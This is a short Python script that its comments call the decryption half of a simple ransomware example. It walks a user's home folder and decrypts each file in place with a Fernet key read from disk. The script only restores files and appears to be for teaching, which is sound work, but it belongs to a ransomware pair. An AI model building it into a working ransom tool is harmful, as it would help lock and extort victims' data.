# decrypt_files.py
# Works in tandem to ransom_example
# Simple example of how ransomware can decrypt files.

from cryptography.fernet import Fernet
import os

TARGET_FOLDER = "/home/USERNAME"  # Same as above

with open("encryption.key", "rb") as key_file:
    key = key_file.read()

cipher = Fernet(key)

for filename in os.listdir(TARGET_FOLDER):
    filepath = os.path.join(TARGET_FOLDER, filename)
    if os.path.isfile(filepath):
        with open(filepath, "rb") as f:
            data = f.read()
        decrypted = cipher.decrypt(data)
        with open(filepath, "wb") as f:
            f.write(decrypted)

print("Files decrypted.")
